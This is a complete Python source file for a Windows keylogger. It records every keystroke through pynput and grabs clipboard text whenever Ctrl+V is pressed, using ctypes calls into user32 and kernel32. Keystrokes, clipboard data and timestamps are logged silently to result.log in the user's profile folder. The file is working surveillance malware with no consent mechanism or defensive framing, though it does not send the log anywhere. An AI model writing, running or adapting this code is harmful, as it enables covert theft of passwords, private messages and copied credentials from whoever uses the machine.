from pynput import keyboard as kb
from pynput.keyboard import Key
import keyboard
import ctypes
import os
from datetime import datetime
special_keys = {
    Key.alt_l: "",
    Key.alt_r: "",
    Key.backspace: " [Backspace] ",
    Key.caps_lock: "",
    Key.cmd_l: " [Win] ",
    Key.ctrl_l: "",
    Key.ctrl_r: "",
    Key.delete: " [Delete] ",
    Key.down: " [Down] ",
    Key.enter: "\n",
    Key.esc: " [Esc] ",
    Key.f1: " [F1] ",
    Key.f2: " [F2] ",
    Key.f3: " [F3] ",
    Key.f4: " [F4] ",
    Key.f5: " [F5] ",
    Key.f6: " [F6] ",
    Key.f7: " [F7] ",
    Key.f8: " [F8] ",
    Key.f9: " [F9] ",
    Key.f10: " [F10] ",
    Key.f11: " [F11] ",
    Key.f12: " [F12] ",
    Key.left: " [Left] ",
    Key.right: " [Right] ",
    Key.shift_l: "",
    Key.shift_r: "",
    Key.space: " ",
    Key.tab: " [Tab] ",
    Key.up: " [Up] ",
}
def get_clipboard():
    kernel32 = ctypes.windll.kernel32
    user32 = ctypes.windll.user32
    CF_TEXT = 1
    kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
    kernel32.GlobalLock.restype = ctypes.c_void_p
    kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
    user32.GetClipboardData.restype = ctypes.c_void_p
    user32.OpenClipboard(0)
    IsClipboardFormatAvailable = user32.IsClipboardFormatAvailable
    GetClipboardData = user32.GetClipboardData
    CloseClipboard = user32.CloseClipboard
    try:
        if IsClipboardFormatAvailable(CF_TEXT):
            data = GetClipboardData(CF_TEXT)
            data_locked = kernel32.GlobalLock(data)
            text = ctypes.c_char_p(data_locked)
            value = text.value
            kernel32.GlobalUnlock(data_locked)
            return value.decode('utf-8', errors='ignore')
    finally:
        CloseClipboard()
def on_press(key):
    path = os.path.join(os.getenv("USERPROFILE"), "result.log")
    with open(path, "a", encoding='utf-8') as file:
        try:
            if key in special_keys:
                file.write(special_keys[key])
            elif key is None:
                file.write("\n" + ("=" * 50) + "[Error]: Key press event was None" + ("=" * 50) + "\n")
            else:
                file.write(key.char)
        except AttributeError:
            file.write(str(key))
def copy_clipboard_data():
    path = os.path.join(os.getenv("USERPROFILE"), "result.log")
    with open(path, "a", encoding='utf-8') as file:
        clipboard_data = get_clipboard()
        if clipboard_data:
            file.write("\n[Clipboard data]: {\n" + str(clipboard_data) + " \n}\n")
        else:
            file.write("\n" + ("=" * 50) + "[Warning]: Clipboard data is empty" + ("=" * 50) + "\n")
def write_date_to_file():
    path = os.path.join(os.getenv("USERPROFILE"), "result.log")
    with open(path, "a", encoding='utf-8') as file:
        current_date = datetime.now().strftime("%m-%d-%Y %H:%M")
        file.write("\n" + ("=" * 50) + "\n[Date]: " + current_date + "\n" + ("=" * 50) + "\n")
write_date_to_file()
keyboard.add_hotkey('ctrl+v', copy_clipboard_data, suppress=False)
with kb.Listener(on_press=on_press) as listener:
    listener.join()
